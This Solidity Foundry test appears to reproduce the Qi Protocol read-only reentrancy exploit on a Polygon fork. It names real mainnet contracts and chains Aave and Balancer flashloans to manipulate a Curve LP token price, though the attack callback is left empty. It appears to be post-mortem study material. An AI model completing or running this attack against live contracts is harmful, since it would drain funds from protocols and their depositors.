// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {TestHarness} from "../../TestHarness.sol";

import {BalancerFlashloan} from "../../utils/BalancerFlashloan.sol";
import {IUniswapV2Router02} from "../../utils/IUniswapV2Router.sol";

import {IERC20} from "../../interfaces/IERC20.sol";
import {IWETH9} from "../../interfaces/IWETH9.sol";

interface IUnitroller {
    function enterMarkets(address[] memory cTokens)
        external
        payable
        returns (uint256[] memory);

    function exitMarket(address market) external;

    // Borrow caps enforced by borrowAllowed for each cToken address. Defaults to zero which corresponds to unlimited borrowing.
    function borrowCaps(address market) external view returns (uint256);

    function getAccountLiquidity(address account)
        external
        view
        returns (
            uint256,
            uint256,
            uint256
        );
}

interface IPriceFeed {
    function getUnderlyingPrice(address cToken) external view returns (uint256);
}

interface IVault is IERC20 {
    function deposit(uint256) external;

    function depositAll() external;

    function withdraw(uint256) external;

    function withdrawAll() external;

    function getPricePerFullShare() external view returns (uint256);

    function upgradeStrat() external;

    function balance() external view returns (uint256);

    function want() external view returns (IERC20);
}

interface ICERC20Delegator {
    function mint(uint256 mintAmount) external payable returns (uint256);

    function balanceOf(address _of) external view returns (uint256);

    function decimals() external view returns (uint16);

    function borrow(uint256 borrowAmount) external payable returns (uint256);

    function borrowBalanceCurrent(address) external returns (uint256);

    function accrueInterest() external;

    function approve(address spender, uint256 amt) external;

    function redeemUnderlying(uint256 redeemAmount)
        external
        payable
        returns (uint256);
}

interface ICurvePool {
    function add_liquidity(
        uint256[2] memory amounts,
        uint256 min_min_amount,
        bool use_eth
    ) external payable returns (uint256);

    function remove_liquidity(
        uint256 amount,
        uint256[2] calldata min_amounts,
        bool use_eth
    ) external payable;

    function token() external pure returns (address);

    function exchange(
        uint256 i,
        uint256 j,
        uint256 dx,
        uint256 min_dy,
        bool use_eth
    ) external payable returns (uint256);
}

interface IAaveFlashloan {
    function flashLoan(
        address arg0,
        address[] memory arg1,
        uint256[] memory arg2,
        uint256[] memory arg3,
        address arg4,
        bytes memory arg5,
        uint16 arg6
    ) external;
}

contract Exploit_Qi_ReadOnlyReentrancy is TestHarness, BalancerFlashloan {
    IAaveFlashloan aave =
        IAaveFlashloan(0x8dFf5E27EA6b7AC08EbFdf9eB090F32ee9a30fcf);

    // The tokens involved in the pool
    IWETH9 WMATIC = IWETH9(0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270);
    IERC20 stLIDOMATIC = IERC20(0x3A58a54C066FdC0f2D55FC9C89F0415C92eBf3C4);
    IERC20 USDC = IERC20(0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174);

    // Beefy delegators. Beefy is an Vault that wants LP_TOKENS from
    // Curve pools.
    ICERC20Delegator STMATIC_MATIC_DELEGATOR =
        ICERC20Delegator(0x570Bc2b7Ad1399237185A27e66AEA9CfFF5F3dB8);
    IVault STMATIC_MATIC_POOL =
        IVault(0xE0570ddFca69E5E90d83Ea04bb33824D3BbE6a85);

    // QIDAO Compound delegator and underlying
    ICERC20Delegator QIDAO_DELEGATOR =
        ICERC20Delegator(0x3dC7E6FF0fB79770FA6FB05d1ea4deACCe823943);
    IERC20 QI_MIMATIC = IERC20(0xa3Fa99A148fA48D14Ed51d610c367C61876997F1);

    // Unitroller and price feed used by the unitroller. The attacker does not query
    // the price (they might have precalculated the amounts) but is useful to
    // generalize the test
    IPriceFeed PRICE_FEED =
        IPriceFeed(0x71585E806402473Ff25eda3e2C3C17168767858a);
    IUnitroller UNITROLLER =
        IUnitroller(0x627742AaFe82EB5129DD33D237FF318eF5F76CBC);

    // STLidoMatic/WMATIC Curve pool
    ICurvePool constant CURVE_STMATIC_POOL =
        ICurvePool(0xFb6FE7802bA9290ef8b00CA16Af4Bc26eb663a28);
    IERC20 CURVE_STMATIC_LP_TOKEN =
        IERC20(0xe7CEA2F6d7b120174BF3A9Bc98efaF1fF72C997d);

    // UniswapV2Router
    IUniswapV2Router02 router =
        IUniswapV2Router02(0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff);

    // Let's store the price of the LP tokens in different moments of the transaction
    // To see how it goes up during the reentrancy and then comes back to normal
    uint256 priceAtBeginning;
    uint256 priceDuringCallback;
    uint256 priceAfterCallback;

    // In reality, the attacker used some minion contracts which they deployed from their
    // main contract to execute the attacks. Here, we simplify and use only one contract
    // and reproduce the attack only to Qi Protocol.
    // The attacker minion address can be found at
    // https://polygonscan.com/address/0x8d1e7cE7DbB14aFB8782EaEa8010938cC457115e
    function setUp() external {
        cheat.createSelectFork("polygon", 34716800); // We pin one block before the exploit happened.

        cheat.label(address(this), "Attacker Contract");
        cheat.label(address(CURVE_STMATIC_POOL), "Curve Pool");
        cheat.label(address(CURVE_STMATIC_LP_TOKEN), "LP Token");
        cheat.label(address(QIDAO_DELEGATOR), "QiDAO Delegator");

        cheat.deal(address(this), 0);
    }

    function test_attack() external {
        run();
    }

    // Same signature as attacker's
    function run() public {
        console.log('===== 1. REQUEST FLASHLOAN ON AAVE ======');
        address[] memory _tokens = new address[](1);
        _tokens[0] = address(WMATIC);

        uint256[] memory _amounts = new uint256[](1);
        _amounts[0] = 15419963467577188022568076;

        uint256[] memory _arg3 = new uint256[](1);
        _arg3[0] = 0;

        aave.flashLoan(
            address(this),
            _tokens,
            _amounts,
            _arg3,
            address(this),
            '',
            0
        );
    }

    function executeOperation(
        address[] memory _tokens,
        uint256[] memory _amounts,
        uint256[] memory _fees,
        address _requester,
        bytes memory /*_data*/
    ) external {
        require(_requester == address(this), "Flashloan not requested");
        require(msg.sender == address(aave), "Not called by Aave");
        require(address(WMATIC) == _tokens[0], "Wrong tokens requested");

        console.log('===== 2. REQUEST FLASHLOAN ON BALANCER ======');

        address[] memory _tokensBalancer = new address[](2);
        _tokensBalancer[0] = address(WMATIC);
        _tokensBalancer[1] = address(stLIDOMATIC);

        uint256[] memory _amountsBalancer = new uint256[](2);
        _amountsBalancer[0] = WMATIC.balanceOf(address(balancer));
        _amountsBalancer[1] = 19664260000000000000000000;

        console.log("Attacker balance", address(this).balance);
        priceAtBeginning = get_lp_token_price_for_compound();
        console.log("==== INITIAL PRICE ====");
        console.log(priceAtBeginning);
        balancer.flashLoan(address(this), _tokensBalancer, _amountsBalancer, "");
    }


    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory ,
        bytes memory
    ) external payable {
        // Sensible requires to aid development
        require(msg.sender == address(balancer), "only callable by balancer");
        require(tokens.length == 2 && tokens.length == amounts.length, "length missmatch");
        require(address(tokens[0]) == address(WMATIC));
        require(address(tokens[1]) == address(stLIDOMATIC));

        console.log('===== 3. HANDLE BALANCER FLASHLOAN ======');


    }





    // =============================== HELPER FUNCTIONS ===============================

    // Gets the price of Curve LP tokens (Beefy's underlying) according to the
    // Compound price's feed
    function get_lp_token_price_for_compound() internal view returns (uint256) {
        return PRICE_FEED.getUnderlyingPrice(address(STMATIC_MATIC_DELEGATOR));
    }
}
